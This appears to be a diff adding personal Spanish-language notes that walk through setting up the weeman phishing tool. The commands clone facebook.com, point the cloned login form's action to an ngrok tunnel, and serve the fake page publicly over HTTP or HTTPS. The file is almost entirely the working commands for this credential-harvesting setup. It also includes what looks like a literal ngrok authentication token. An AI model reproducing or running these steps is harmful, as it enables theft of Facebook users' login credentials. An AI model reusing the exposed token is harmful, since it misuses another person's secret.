@@ -1,0 +1,34 @@
+https://github.com/evait-security/weeman.git
+
+./ngrok authtoken <YOUR_AUTH_TOKEN> 
+
+$ ./ngrok authtoken 6yrP6qYcjvHsWJBaw8Kju_33hUt2mdGRLpKZGdPHcY6
+
+ ./ngrok http 80
+************************
+
+--de copia a bin para ejecutarlo
+sudo cp /ruta/ngrok /usr/bin
+
+--descargar weeman
+git clone https://github.com/samyoyo/weeman.git
+
+--para abrir weeman
+cd weeman 
+chmod +x weeman.py 
+python weeman.py
+show
+
+--otra terminal
+ngrok http 8080
+
+--en la terminal con el weeman abierto ejecutar:
+set url https://facebook.com
+set action_url xxx_ngrok.io
+set port 8080
+run
+
+--para utilizar https no http en ngrok
+ngrok http -bind-tls=true 8080
+
+
